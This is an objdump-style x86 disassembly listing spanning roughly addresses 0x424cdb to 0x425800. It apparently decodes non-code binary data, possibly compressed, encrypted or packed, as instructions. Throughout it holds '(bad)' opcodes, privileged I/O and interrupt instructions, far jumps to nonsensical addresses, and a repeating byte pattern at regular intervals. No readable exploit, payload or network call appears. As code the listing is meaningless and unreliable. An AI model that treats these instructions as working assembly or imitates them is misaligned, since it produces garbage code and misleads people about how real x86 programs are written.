  424cdb:	push   ds
  424cdc:	sub    al,0x6c
  424cde:	ror    DWORD PTR [ebx+0x3180239],1
  424ce4:	xlat   BYTE PTR ds:[ebx]
  424ce5:	or     BYTE PTR [eax+0xee5e1fe],bh
  424ceb:	push   esi
  424cec:	add    al,0x0
	...
  424d56:	ins    BYTE PTR es:[edi],dx
  424d57:	fidiv  DWORD PTR [edx+ebp*2-0x2101914a]
  424d5e:	bound  ebx,QWORD PTR [ebx+0x3ccb51a8]
  424d64:	mov    ah,0xb
  424d66:	mov    bl,0x8a
  424d68:	add    DWORD PTR [eax],eax
  424d6a:	inc    DWORD PTR [eax]
  424d6c:	add    BYTE PTR [eax],al
  424d6e:	and    al,0xb7
  424d70:	add    eax,0xff9f2599
  424d75:	push   ds
  424d76:	and    eax,0x73ddf430
  424d7b:	sub    eax,0x13452ed2
  424d80:	addr16 in eax,dx
  424d82:	loop   0x424df6
  424d84:	jo     0x424d13
  424d86:	xor    bh,BYTE PTR [edx-0x3a92aaff]
  424d8c:	inc    ebx
  424d8d:	mov    dl,0x24
  424d8f:	inc    DWORD PTR [ebx-0x38d6a8c2]
  424d95:	mov    BYTE PTR [ecx],dl
  424d97:	xchg   ebp,eax
  424d98:	xor    eax,0x42fb4e12
  424d9d:	inc    ebp
  424d9e:	mov    ecx,0x3fa922
  424da3:	fbstp  TBYTE PTR [edx]
  424da5:	fidiv  DWORD PTR [ebx-0x4c]
  424da8:	inc    ecx
  424da9:	je     0x424da1
  424dab:	adc    eax,0x2c078568
  424db0:	stos   BYTE PTR es:[edi],al
  424db1:	sub    bl,BYTE PTR [esi]
  424db3:	mov    ecx,0x9d5e2726
  424db8:	xchg   BYTE PTR [ecx+0x24],dl
  424dbb:	in     eax,dx
  424dbc:	test   al,0x58
  424dbe:	push   ebp
  424dbf:	lods   eax,DWORD PTR ds:[esi]
  424dc1:	jae    0x424e10
  424dc3:	imul   ebx,DWORD PTR [edx*1-0x26d9de67],0x7f
  424dcb:	fisub  WORD PTR ds:0xc1ed76a
  424dd1:	rol    DWORD PTR [esi-0x1460adbf],0x99
  424dd8:	mov    BYTE PTR [ecx+0x32],0x33
  424ddc:	or     dh,BYTE PTR [edx-0x3f470f23]
  424de2:	aas    
  424de3:	ds sti 
  424de5:	mov    ecx,0xc1197a7
  424dea:	(bad)  
  424deb:	(bad)  
  424dec:	shl    BYTE PTR [eax+0x18],cl
  424def:	loopne 0x424da1
  424df1:	xchg   esi,eax
  424df2:	scas   eax,DWORD PTR es:[edi]
  424df3:	add    eax,0xa343a379
  424df8:	rol    DWORD PTR [ebx],0xbb
  424dfb:	xlat   BYTE PTR es:[ebx]
  424dfd:	imul   esp,DWORD PTR [edx+edi*4],0x46f98b5b
  424e04:	dec    ebp
  424e05:	lahf   
  424e06:	mov    BYTE PTR ds:0x4a9035a9,bl
  424e0c:	das    
  424e0d:	jno    0x424de8
  424e0f:	sar    DWORD PTR cs:[esi],0x2f
  424e13:	js     0x424dde
  424e15:	sub    edi,DWORD PTR ds:0x30664180
  424e1b:	jmp    0x424e77
  424e1d:	ret    
  424e1e:	leave  
  424e1f:	dec    edi
  424e20:	int3   
  424e21:	cmp    eax,0x94de872c
  424e26:	fs sub bl,bl
  424e29:	sahf   
  424e2a:	adc    al,0xaf
  424e2c:	push   ebx
  424e2d:	cld    
  424e2e:	cmp    al,0x9
  424e30:	repz or DWORD PTR [eax],esi
  424e33:	dec    edx
  424e34:	add    BYTE PTR [edi],bl
  424e36:	je     0x424e25
  424e38:	hlt    
  424e39:	nop
  424e3a:	xchg   ebp,eax
  424e3b:	es jecxz 0x424ead
  424e3e:	add    edx,DWORD PTR [edx+0x21803d97]
  424e44:	cmp    al,0x4c
  424e46:	add    al,BYTE PTR [ebx+edx*4-0x6226d95f]
  424e4d:	in     eax,0x59
  424e4f:	mov    ss,WORD PTR [ecx+0x5e7df3d4]
  424e55:	mov    al,0x60
  424e57:	inc    esi
  424e58:	fwait
  424e59:	adc    ch,bh
  424e5b:	pop    eax
  424e5c:	(bad)  
  424e5d:	jmp    0x648b:0x36d86fa6
  424e64:	pop    edi
  424e65:	push   esi
  424e66:	call   0xc54c72ac
  424e6b:	inc    edi
  424e6c:	xor    al,0x0
	...
  424ed6:	cmp    eax,0xf361d20c
  424edb:	(bad)  
  424edc:	mov    edi,0x4bceee5c
  424ee1:	jns    0x424ee1
  424ee3:	outs   dx,DWORD PTR ds:[esi]
  424ee4:	mov    al,ds:0x18bb211
  424ee9:	add    bh,bh
  424eeb:	add    BYTE PTR [eax],al
  424eed:	add    BYTE PTR [edx],al
  424eef:	fs sahf 
  424ef1:	push   ds
  424ef2:	sub    eax,0x41b6ba75
  424ef7:	ds push edi
  424ef9:	rcl    BYTE PTR [bp+si+0x3d4a],0xe4
  424eff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424f00:	push   0x9df0dc4
  424f05:	mov    dl,0xfd
  424f07:	xor    esi,DWORD PTR [esi-0x65936eba]
  424f0d:	pusha  
  424f0e:	arpl   si,bx
  424f10:	pop    ss
  424f11:	test   eax,0x98c7195f
  424f16:	mov    ch,0x7a
  424f18:	mov    bh,0xdc
  424f1a:	mov    cl,0xe7
  424f1c:	mov    ah,0x2e
  424f1e:	sub    eax,0xdee75ffa
  424f23:	jno    0x424ed1
  424f25:	adc    edi,ecx
  424f27:	in     al,dx
  424f28:	mov    ds:0x9fc1fdc4,al
  424f2d:	fimul  WORD PTR [edx-0x62a0c580]
  424f33:	push   0xffffffe8
  424f35:	pop    ds
  424f36:	push   edi
  424f37:	cmc    
  424f38:	inc    ecx
  424f39:	(bad)  
  424f3a:	aas    
  424f3b:	inc    ecx
  424f3c:	add    ecx,DWORD PTR [eax+esi*4+0x43]
  424f40:	call   0xa2b3e5f8
  424f45:	pop    esp
  424f46:	push   es
  424f47:	sub    DWORD PTR [ebx],0x3ef214a6
  424f4d:	cmc    
  424f4e:	adc    eax,0xc9a87dac
  424f53:	xchg   ebp,eax
  424f54:	cld    
  424f55:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424f56:	into   
  424f57:	daa    
  424f58:	add    BYTE PTR [ebp+0x6a9bf7d4],dl
  424f5e:	sbb    ecx,esp
  424f60:	ror    DWORD PTR [edx+edx*4+0x1c5bc054],1
  424f67:	cwde   
  424f68:	adc    BYTE PTR [esi],0xa8
  424f6b:	fnstsw WORD PTR [edi+0x775f58da]
  424f71:	push   0x5b5ce8c
  424f76:	ins    DWORD PTR es:[edi],dx
  424f77:	xchg   esi,eax
  424f78:	mov    bl,0xe7
  424f7a:	adc    DWORD PTR [esi],0x79640ad5
  424f80:	repz inc dx
  424f83:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424f84:	xchg   edx,eax
  424f85:	mov    eax,ds:0xdf3300a8
  424f8a:	xchg   edx,eax
  424f8b:	dec    esi
  424f8c:	retf   0xcd2a
  424f8f:	int3   
  424f90:	fisttp DWORD PTR [eax-0x7bcf897d]
  424f96:	idiv   esi
  424f98:	out    dx,eax
  424f99:	add    ebx,DWORD PTR [edi]
  424f9b:	mov    ah,BYTE PTR [eax+0x3c]
  424f9e:	outs   dx,BYTE PTR ds:[esi]
  424f9f:	pop    es
  424fa0:	mov    esp,0x9172d06c
  424fa5:	cwde   
  424fa6:	imul   edx,DWORD PTR [edi-0x1b],0xd4105773
  424fad:	mov    esp,0x3a55cd8a
  424fb2:	cli    
  424fb3:	lock mov ecx,0x3bd1ba6e
  424fb9:	fs (bad) 
  424fbc:	iret   
  424fbd:	jne    0x424f97
  424fbf:	in     eax,0xd7
  424fc1:	mov    esi,0xdedbc
  424fc6:	xlat   BYTE PTR ds:[ebx]
  424fc7:	mov    esp,DWORD PTR [ebx+0x31]
  424fca:	dec    esp
  424fcb:	lock test DWORD PTR [edx+0x43627bc4],esi
  424fd2:	sub    ebp,DWORD PTR [edx+0x2ad5ad21]
  424fd8:	ror    DWORD PTR [edi+edi*4+0x61],cl
  424fdc:	arpl   WORD PTR [eax+ebp*1],cx
  424fdf:	mov    DWORD PTR [edx+0x4b811eba],ebp
  424fe5:	xchg   dl,bl
  424fe7:	iret   
  424fe8:	sub    esi,DWORD PTR [esi-0x1]
  424feb:	popf   
  424fec:	pushf  
	...
  425055:	add    BYTE PTR [ebx+0x16],cl
  425058:	int    0x41
  42505a:	fstp   st(3)
  42505c:	iret   
  42505d:	push   ds
  42505e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42505f:	fadd   st(3),st
  425061:	dec    eax
  425062:	shl    BYTE PTR [ecx-0x734e110a],1
  425068:	add    DWORD PTR [eax],eax
  42506a:	inc    DWORD PTR [eax]
  42506c:	add    BYTE PTR [eax],al
  42506e:	push   eax
  42506f:	lods   eax,DWORD PTR ds:[esi]
  425070:	mov    ah,0x33
  425072:	dec    esi
  425073:	int3   
  425074:	idiv   DWORD PTR [edi]
  425076:	adc    ah,BYTE PTR [edi]
  425078:	out    dx,eax
  425079:	xchg   ebx,eax
  42507a:	clc    
  42507b:	fwait
  42507c:	pop    ebx
  42507d:	xchg   esi,eax
  42507e:	mov    esi,0x49bfdd3c
  425083:	popf   
  425084:	add    ecx,DWORD PTR [ebp+ecx*4-0x1d]
  425088:	sub    BYTE PTR [edi+0x5ebdb68f],al
  42508e:	enter  0x527e,0x3
  425092:	aaa    
  425093:	or     DWORD PTR [ebx+0x2b],edi
  425096:	(bad)  
  425097:	sti    
  425098:	push   ss
  425099:	pop    esp
  42509a:	iret   
  42509b:	push   ecx
  42509c:	mov    ebx,0x547e2cb2
  4250a1:	mov    esi,0x9004c6fd
  4250a6:	iret   
  4250a7:	adc    eax,0x869e7091
  4250ac:	dec    edx
  4250ad:	mov    ebx,0xd6b65351
  4250b2:	fimul  WORD PTR [eax+0x21]
  4250b5:	add    dl,BYTE PTR [edx]
  4250b7:	mov    eax,0x3ff16b4d
  4250bc:	out    0x95,al
  4250be:	push   edi
  4250bf:	and    al,BYTE PTR [eax-0x10]
  4250c2:	push   ebx
  4250c3:	and    eax,0xa8d0b0d4
  4250c8:	shr    DWORD PTR ds:0x686d9c74,1
  4250ce:	xchg   DWORD PTR [edi+0x34],ecx
  4250d1:	out    0x43,al
  4250d3:	into   
  4250d4:	sbb    BYTE PTR [esi],ah
  4250d6:	inc    esi
  4250d7:	out    0x90,eax
  4250d9:	sbb    esp,ebx
  4250db:	push   ecx
  4250dc:	inc    eax
  4250dd:	out    0x77,al
  4250df:	out    dx,al
  4250e0:	and    ebp,ebp
  4250e2:	fwait
  4250e3:	inc    esp
  4250e4:	aam    0x86
  4250e6:	jb     0x4250a9
  4250e8:	in     eax,dx
  4250e9:	repnz or DWORD PTR [esi],esi
  4250ec:	adc    BYTE PTR [ebx+esi*1],al
  4250ef:	mov    fs,WORD PTR [eax-0x73cc602f]
  4250f5:	mov    ds:0xad7c0293,eax
  4250fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4250fb:	stos   BYTE PTR es:[edi],al
  4250fc:	and    BYTE PTR [edi-0x4d61b7c0],bh
  425102:	fcomip st,st(7)
  425104:	mov    edi,0xf4e17e6
  425109:	adc    BYTE PTR [esi],bl
  42510b:	pop    esi
  42510c:	dec    esp
  42510d:	loopne 0x4250dc
  42510f:	jl     0x42515f
  425111:	mov    dh,ah
  425113:	shl    BYTE PTR ds:0x9a0d6313,0x4c
  42511a:	sub    ecx,DWORD PTR [esi-0x5c]
  42511d:	hlt    
  42511e:	es inc esi
  425120:	push   ebx
  425121:	and    ecx,DWORD PTR [ebx-0xdb3ae23]
  425127:	stc    
  425128:	sbb    BYTE PTR [edx-0x364a6ec6],dh
  42512e:	cld    
  42512f:	xchg   esi,eax
  425130:	aad    0x9c
  425132:	je     0x425123
  425134:	jecxz  0x425125
  425136:	popf   
  425137:	imul   esi,DWORD PTR [ebx],0x1fbfb571
  42513d:	xor    dl,al
  42513f:	dec    ebp
  425140:	sub    DWORD PTR [esi-0x46],esi
  425143:	xchg   esp,eax
  425144:	jbe    0x42512f
  425146:	call   0xfcbe69bc
  42514b:	fist   WORD PTR [eax-0x44cb2f34]
  425151:	ret    0x1d2b
  425154:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425155:	aaa    
  425156:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425157:	push   eax
  425158:	mov    ah,0x4b
  42515a:	dec    edx
  42515b:	pop    bp
  42515d:	jno    0x42516b
  42515f:	out    dx,al
  425160:	je     0x425182
  425162:	mov    ebx,0x81a58781
  425167:	push   es
  425168:	mov    esi,0xffc8259e
	...
  4251d5:	add    dh,bl
  4251d7:	adc    DWORD PTR [edi-0x15020dd],ebx
  4251dd:	std    
  4251de:	out    dx,al
  4251df:	jmp    0x80ef:0x576992e8
  4251e6:	mov    al,0x8d
  4251e8:	add    DWORD PTR [eax],eax
  4251ea:	inc    DWORD PTR [eax]
  4251ec:	add    BYTE PTR [eax],al
  4251ee:	add    eax,0x6624c3b5
  4251f3:	xchg   ebp,eax
  4251f4:	lods   eax,DWORD PTR ds:[esi]
  4251f5:	mov    ds:0xfa848e4e,eax
  4251fa:	mov    ?,WORD PTR [edi]
  4251fc:	pop    ds
  4251fd:	cld    
  4251fe:	cli    
  4251ff:	cmp    al,0x52
  425201:	popa   
  425202:	dec    ebp
  425203:	leave  
  425204:	add    eax,ebx
  425206:	mov    BYTE PTR [ecx],cl
  425208:	or     edi,DWORD PTR [edi]
  42520a:	repnz pop eax
  42520c:	jl     0x4251c6
  42520e:	inc    ebx
  42520f:	pushf  
  425210:	push   0x5f
  425212:	enter  0x3365,0x9d
  425216:	jg     0x42523d
  425218:	mov    DWORD PTR [bx+si],0xf4229395
  42521f:	xchg   edx,eax
  425220:	aaa    
  425221:	pop    ds
  425222:	mov    cl,0x95
  425224:	and    BYTE PTR [ecx],dl
  425226:	hlt    
  425227:	xor    al,0x39
  425229:	adc    edx,esp
  42522b:	cmp    DWORD PTR [ecx+0x3f],esi
  42522e:	not    BYTE PTR [ebx+edx*4-0x22f75526]
  425235:	dec    esi
  425236:	lock xor ah,BYTE PTR ds:[ebx+0x3c876bbb]
  42523e:	sbb    esi,DWORD PTR [ebp-0x112dfa03]
  425244:	sbb    bh,dl
  425246:	xor    eax,0x2d907f93
  42524b:	fild   QWORD PTR [ebp+eax*8+0x62]
  42524f:	mov    eax,0x6703e62f
  425254:	pop    eax
  425255:	rol    BYTE PTR [ebx],0x24
  425258:	ficomp DWORD PTR [ecx+edi*2-0x3ed5f1c3]
  42525f:	loop   0x4252c0
  425261:	in     al,0xb5
  425263:	sbb    BYTE PTR [edx-0x9cadf84],ah
  425269:	call   0xe9ff1b6f
  42526e:	mov    al,0xda
  425270:	rcl    DWORD PTR [edx],1
  425272:	cli    
  425273:	adc    esp,DWORD PTR [edx]
  425275:	xchg   BYTE PTR ds:0x7a773c5a,bh
  42527b:	or     ecx,ecx
  42527d:	xchg   DWORD PTR [edi],eax
  42527f:	or     DWORD PTR [ebp+ebp*1+0x35],0x53
  425284:	test   eax,0x58e1ff71
  425289:	test   eax,0x9048438d
  42528e:	or     dh,bh
  425290:	stos   BYTE PTR es:[edi],al
  425291:	pop    eax
  425292:	jl     0x425258
  425294:	lods   al,BYTE PTR ds:[esi]
  425295:	pop    eax
  425296:	xor    al,0x4f
  425298:	mov    edx,esp
  42529a:	sbb    esi,DWORD PTR ds:0xc491a2b6
  4252a0:	inc    ebp
  4252a1:	into   
  4252a2:	sti    
  4252a3:	adc    BYTE PTR [ebx+eiz*2-0x7914baae],bl
  4252aa:	xchg   DWORD PTR [edx],ebp
  4252ac:	js     0x4252b2
  4252ae:	xor    al,0xde
  4252b0:	loop   0x425326
  4252b2:	or     al,0x19
  4252b4:	xor    DWORD PTR [edx+eiz*2-0x19],edi
  4252b8:	adc    BYTE PTR [ecx],bh
  4252ba:	inc    ebp
  4252bb:	mov    ebx,0xa4ea3266
  4252c0:	aas    
  4252c1:	retw   0xdb7d
  4252c5:	rcl    DWORD PTR [ecx+0x3c],cl
  4252c8:	addr16 mov bl,0xaa
  4252cb:	div    DWORD PTR [ebp+0x789141c2]
  4252d1:	inc    edx
  4252d2:	xchg   esi,eax
  4252d3:	loope  0x425332
  4252d5:	adc    DWORD PTR [edx],eax
  4252d7:	and    al,0x4c
  4252d9:	pop    edx
  4252da:	clc    
  4252db:	xor    BYTE PTR [edx+edi*1+0x44],cl
  4252df:	out    dx,eax
  4252e0:	or     eax,0xefa5c74f
  4252e5:	retf   0xf59e
  4252e8:	loop   0x425320
  4252ea:	hlt    
  4252eb:	dec    esi
  4252ec:	test   DWORD PTR [eax],0x0
	...
  425356:	lods   al,BYTE PTR ds:[esi]
  425357:	les    esi,FWORD PTR [ebx-0x32]
  42535a:	jnp    0x42535b
  42535c:	mov    ebp,0x45495ee6
  425361:	icebp  
  425362:	bound  edx,QWORD PTR ds:0x8eaf55a0
  425368:	add    DWORD PTR [eax],eax
  42536a:	inc    DWORD PTR [eax]
  42536c:	add    BYTE PTR [eax],al
  42536e:	and    ebx,DWORD PTR [edi]
  425370:	inc    esi
  425371:	outs   dx,BYTE PTR ds:[esi]
  425372:	dec    edx
  425373:	inc    DWORD PTR gs:[ecx+0x78]
  425377:	pop    es
  425378:	xchg   BYTE PTR ds:0x6bed1d85,bl
  42537e:	dec    ecx
  42537f:	sub    BYTE PTR [eax],dl
  425381:	sub    al,0x28
  425383:	jmp    0x4253ad
  425385:	jno    0x42537e
  425387:	das    
  425388:	pop    es
  425389:	sti    
  42538a:	and    eax,0x665e6b6a
  42538f:	cmp    edx,DWORD PTR [ebp-0x2349b7e6]
  425395:	dec    ecx
  425396:	jnp    0x42534d
  425398:	outs   dx,DWORD PTR ds:[esi]
  425399:	sar    DWORD PTR [esi],0xfb
  42539c:	test   BYTE PTR [ebx+0x59],ah
  42539f:	sbb    BYTE PTR [ebp-0x50077c68],bl
  4253a5:	scas   al,BYTE PTR es:[edi]
  4253a6:	lock adc eax,0xc725762d
  4253ac:	sub    al,0xf8
  4253ae:	fdivr  DWORD PTR [ebx+0x40]
  4253b1:	loopne 0x4253e4
  4253b3:	icebp  
  4253b4:	rol    DWORD PTR [eax-0x76ed6b4],0xe
  4253bb:	jno    0x4253a9
  4253bd:	jne    0x425359
  4253bf:	jmp    0xacc1d275
  4253c4:	adc    edx,DWORD PTR [esi]
  4253c6:	sub    edi,DWORD PTR [edx-0x196fe162]
  4253cc:	cwde   
  4253cd:	sub    al,0x68
  4253cf:	push   ds
  4253d0:	xchg   esp,eax
  4253d1:	mov    bl,dl
  4253d3:	push   eax
  4253d4:	mov    edx,DWORD PTR [ebx]
  4253d6:	fld    QWORD PTR [ecx+0x7e90a827]
  4253dc:	les    edx,FWORD PTR [edi+0x6a]
  4253df:	or     al,0xc3
  4253e1:	xchg   esi,eax
  4253e2:	sub    eax,0x662e222e
  4253e7:	bound  esi,QWORD PTR [esi]
  4253e9:	lea    esp,[ecx-0x27]
  4253ec:	in     eax,0xdf
  4253ee:	icebp  
  4253ef:	sub    DWORD PTR [edx-0x46],0x7a
  4253f3:	es inc edi
  4253f5:	adc    BYTE PTR [edi+esi*4+0x4bddc6e7],bh
  4253fc:	dec    eax
  4253fd:	push   ds
  4253fe:	fsubr  QWORD PTR [eax]
  425400:	mov    edx,0x698526ab
  425405:	inc    edi
  425406:	or     BYTE PTR [edx+0x618d0bd5],bl
  42540c:	xchg   edx,eax
  42540d:	xor    eax,0xaf9f700
  425412:	stos   DWORD PTR es:[edi],eax
  425413:	xor    cl,BYTE PTR [esi-0x3eed48a]
  425419:	xchg   esi,eax
  42541a:	int    0x61
  42541c:	xchg   ecx,eax
  42541d:	push   0xffffff80
  42541f:	pop    edx
  425420:	adc    al,0x6e
  425422:	fxch   st(0)
  425424:	enter  0x364c,0x3a
  425428:	and    esp,DWORD PTR [edx]
  42542a:	(bad)  
  42542b:	(bad)  
  42542c:	and    al,BYTE PTR [eax]
  42542e:	inc    edx
  42542f:	or     bl,BYTE PTR [ebx+0x66]
  425432:	xchg   esi,eax
  425433:	pop    ebp
  425434:	(bad)  
  425435:	push   0xa62290db
  42543a:	mov    ch,0x8c
  42543c:	ret    0x42f4
  42543f:	int    0xf0
  425441:	imul   ecx,ebx,0x26
  425444:	jg     0x4253c6
  425446:	repnz and BYTE PTR [ecx-0x1a26f86c],cl
  42544d:	inc    ecx
  42544e:	or     esp,ecx
  425450:	je     0x4253eb
  425452:	add    ah,BYTE PTR [eax]
  425454:	adc    DWORD PTR [esi],ebx
  425456:	inc    esi
  425457:	imul   ecx,DWORD PTR [ecx],0xf
  42545a:	loopne 0x425490
  42545c:	push   ebx
  42545d:	mov    eax,0x2aacbc95
  425462:	fcom   QWORD PTR [edi+0x4128140]
  425468:	sub    ch,al
  42546a:	mov    esi,0xe207
	...
  4254d3:	add    BYTE PTR [eax],al
  4254d5:	add    BYTE PTR [edx+0x9],al
  4254d8:	les    ebp,FWORD PTR [ecx-0x14901231]
  4254de:	fcomp  DWORD PTR [edx]
  4254e1:	add    edi,DWORD PTR [ebx]
  4254e3:	add    BYTE PTR [edi-0x6f],dh
  4254e6:	scas   al,BYTE PTR es:[edi]
  4254e7:	pop    DWORD PTR [ecx]
  4254e9:	add    bh,bh
  4254eb:	add    BYTE PTR [eax],al
  4254ed:	add    BYTE PTR [esi+edi*2+0xcae9bcf],dh
  4254f4:	adc    al,0x47
  4254f6:	pop    ss
  4254f7:	cmc    
  4254f8:	lahf   
  4254f9:	rep ins DWORD PTR es:[edi],dx
  4254fb:	mov    edx,0x185779d8
  425500:	cmp    eax,0xa528577e
  425505:	arpl   WORD PTR [ebp+0x26],di
  425508:	retf   
  425509:	dec    esi
  42550a:	sar    DWORD PTR [ebp-0x7a],1
  42550d:	add    ah,BYTE PTR [ebp-0x12]
  425510:	test   BYTE PTR ds:0x49f8b40a,bh
  425516:	mov    DWORD PTR [edi],ebx
  425518:	and    ebp,DWORD PTR [ebx+ecx*1+0x317bc372]
  42551f:	fidivr WORD PTR [ebp-0x32]
  425522:	pop    ebp
  425523:	or     DWORD PTR [ebx+esi*8-0x48],ebp
  425527:	lfence 
  42552a:	inc    ecx
  42552b:	lea    edx,[esi-0x62]
  42552e:	inc    edi
  42552f:	sbb    DWORD PTR [eax],ebp
  425531:	in     al,dx
  425532:	adc    DWORD PTR [edi-0x7a49b558],edx
  425538:	jp     0x425522
  42553a:	(bad)  
  42553c:	jne    0x4254d7
  42553e:	pop    ss
  42553f:	or     BYTE PTR [eax+0x4adb625c],ah
  425545:	hlt    
  425546:	mov    BYTE PTR [esi+esi*1+0x4b20e370],ch
  42554d:	retf   
  42554e:	adc    al,0xd7
  425550:	shl    BYTE PTR [ebx+ebx*2],1
  425553:	jno    0x425513
  425555:	jmp    0x8f6c8922
  42555a:	outs   dx,BYTE PTR ds:[esi]
  42555b:	or     BYTE PTR ds:0xa326d628,bh
  425561:	xor    BYTE PTR [ebp+0x7d],bl
  425564:	repnz repz xor cl,BYTE PTR [eax+edx*4-0x2bef0531]
  42556d:	jmp    0xc3cc:0xe583729b
  425574:	mov    DWORD PTR [ebx+0x682828f9],0x874258ad
  42557e:	fsubr  st(4),st
  425580:	not    BYTE PTR [edx]
  425582:	test   DWORD PTR [edx+eiz*2-0x20],ebx
  425586:	hlt    
  425587:	sbb    dl,BYTE PTR [ecx]
  425589:	push   esp
  42558a:	mov    ecx,0xffd4a64f
  42558f:	(bad)  
  425590:	push   DWORD PTR [esi+0x49]
  425593:	sti    
  425594:	jae    0x425562
  425596:	dec    edx
  425597:	jb     0x425527
  425599:	xor    al,0xc4
  42559b:	sbb    ebp,DWORD PTR cs:[ebp+0x7f7ec8c8]
  4255a2:	sbb    ax,0x4840
  4255a6:	popa   
  4255a7:	mov    BYTE PTR [ebx],bl
  4255a9:	fisubr DWORD PTR [esi+0x5bc9e1fd]
  4255af:	retf   0xd004
  4255b2:	or     DWORD PTR [edi+0xa],ecx
  4255b5:	loopne 0x42559d
  4255b7:	fwait
  4255b8:	mov    cl,0xb0
  4255ba:	xchg   ebx,eax
  4255bb:	inc    esp
  4255bc:	(bad)  [ebp+0x49]
  4255bf:	jmp    0x3697:0xffe469d8
  4255c6:	lods   eax,DWORD PTR ds:[esi]
  4255c7:	frstor [ebp+0x415185b9]
  4255cd:	sbb    DWORD PTR [ebx],ebx
  4255cf:	cmp    BYTE PTR [ecx+0x54],al
  4255d2:	mov    ebx,0xbf885c85
  4255d7:	imul   esi
  4255d9:	jns    0x4255d1
  4255db:	inc    edi
  4255dc:	add    DWORD PTR [edi+0x3e],edx
  4255df:	cs lahf 
  4255e1:	aas    
  4255e2:	mov    esi,0xb9b9375e
  4255e7:	scas   al,BYTE PTR es:[edi]
  4255e8:	sub    edi,0xcb24f7
	...
  425656:	(bad)  
  425657:	jmp    0xfef4:0xfe6e7a4e
  42565e:	dec    ebp
  42565f:	mov    esi,0xa0d4f13a
  425664:	iret   
  425665:	in     eax,dx
  425666:	lods   eax,DWORD PTR ds:[esi]
  425667:	nop
  425668:	add    DWORD PTR [eax],eax
  42566a:	inc    DWORD PTR [eax]
  42566c:	add    BYTE PTR [eax],al
  42566e:	pop    es
  42566f:	cdq    
  425670:	jns    0x425699
  425672:	inc    esp
  425673:	das    
  425674:	mov    ebp,0x67996c35
  425679:	stc    
  42567a:	and    eax,0x90ba623b
  42567f:	cmp    al,0x47
  425681:	inc    edi
  425682:	clc    
  425683:	pop    ss
  425684:	cdq    
  425685:	xchg   ebp,eax
  425686:	addr16 and eax,0xbdc5c6e1
  42568c:	iret   
  42568d:	mov    bh,0xb3
  42568f:	pop    ebx
  425690:	mov    DWORD PTR [edi+ebp*2+0x8],ebx
  425694:	ret    
  425695:	and    al,0x0
  425697:	repnz sti 
  425699:	jg     0x42565d
  42569b:	addr16 jl 0x4256cc
  42569e:	sbb    bl,BYTE PTR [ebx]
  4256a0:	in     al,0x85
  4256a2:	or     DWORD PTR [ebx-0x39],esp
  4256a5:	pusha  
  4256a6:	dec    esi
  4256a7:	(bad)  
  4256a9:	cli    
  4256aa:	mov    ebx,0xa26da530
  4256af:	sbb    eax,eax
  4256b1:	pop    esi
  4256b2:	iret   
  4256b3:	mov    dl,0xb5
  4256b5:	mov    dl,0x12
  4256b7:	cmp    esp,DWORD PTR [edx-0x2d22e8f0]
  4256bd:	test   al,0x53
  4256bf:	stc    
  4256c0:	pusha  
  4256c1:	adc    al,BYTE PTR [ecx+edi*1]
  4256c4:	xor    al,0x6a
  4256c6:	call   0x9bfc:0x849c0218
  4256cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4256ce:	and    al,0xc7
  4256d0:	aam    0x7c
  4256d2:	push   0xffffffe4
  4256d4:	not    ebx
  4256d6:	fisubr DWORD PTR [esi-0x32]
  4256d9:	mov    BYTE PTR [ebx+0x55fb15e3],dh
  4256df:	(bad)  
  4256e0:	into   
  4256e1:	mov    al,ds:0x86f0a63d
  4256e6:	aaa    
  4256e7:	lods   al,BYTE PTR ds:[esi]
  4256e8:	shr    DWORD PTR [eax+eiz*8-0x50],0x74
  4256ed:	iret   
  4256ee:	cdq    
  4256ef:	addr16 add ebx,edi
  4256f2:	sar    bh,1
  4256f4:	les    eax,FWORD PTR [eax+0x16]
  4256f7:	mov    cl,0x26
  4256f9:	xor    al,0xb
  4256fb:	pop    edi
  4256fc:	mov    dh,0x62
  4256fe:	dec    esi
  4256ff:	inc    edi
  425700:	and    eax,0x2e3adb06
  425705:	adc    BYTE PTR [ebx+esi*1-0x4c],0x25
  42570a:	rcr    BYTE PTR [ebx+0x44481c47],0xec
  425711:	repnz sub edi,DWORD PTR [edi]
  425714:	rcl    BYTE PTR [edx],0x60
  425717:	cmc    
  425718:	mov    WORD PTR [eax+0x210ff9df],fs
  42571e:	in     al,0x23
  425720:	push   eax
  425721:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425722:	xor    eax,DWORD PTR [ebp+0x43efbefb]
  425728:	jl     0x4256d1
  42572a:	out    0xc8,al
  42572c:	cmp    cl,ch
  42572e:	push   ebp
  42572f:	jl     0x42573b
  425731:	adc    edi,edx
  425733:	add    edi,edx
  425735:	cs iret 
  425737:	push   esi
  425738:	in     eax,dx
  425739:	(bad)  
  42573a:	outs   dx,BYTE PTR ds:[esi]
  42573b:	mov    esi,0xe824628e
  425740:	sti    
  425741:	fcmovb st,st(7)
  425743:	xor    esi,DWORD PTR ds:[edx-0x17483496]
  42574a:	(bad)  
  42574b:	daa    
  42574c:	pop    ecx
  42574d:	xchg   edx,eax
  42574e:	call   0x8b196a06
  425753:	jns    0x425768
  425755:	sub    al,0xda
  425757:	inc    ebp
  425758:	pop    esp
  425759:	and    bl,BYTE PTR [ebx]
  42575b:	push   0xf092ffcb
  425760:	mov    al,0x2
  425762:	sbb    esp,DWORD PTR [ebp-0xe09156a]
  425768:	cs and eax,0xb7a073
	...
  4257d6:	(bad)  
  4257d7:	aaa    
  4257d8:	shl    BYTE PTR [ebx+esi*8],cl
  4257db:	cmc    
  4257dc:	div    bh
  4257de:	test   DWORD PTR [edi+0x3f],0xd4dd8d74
  4257e5:	aas    
  4257e6:	lods   al,BYTE PTR ds:[esi]
  4257e7:	xchg   ecx,eax
  4257e8:	add    DWORD PTR [eax],eax
  4257ea:	inc    DWORD PTR [eax]
  4257ec:	add    BYTE PTR [eax],al
  4257ee:	cli    
  4257ef:	cmp    ch,dh
  4257f1:	push   ss
  4257f2:	test   eax,0xf00b6182
  4257f7:	xor    edi,edx
  4257f9:	push   ds
  4257fa:	push   edx
  4257fb:	out    0x29,al
  4257fd:	add    al,0xc5
  4257ff:	xchg   esp,eax
  425800:	fs and al,0x11
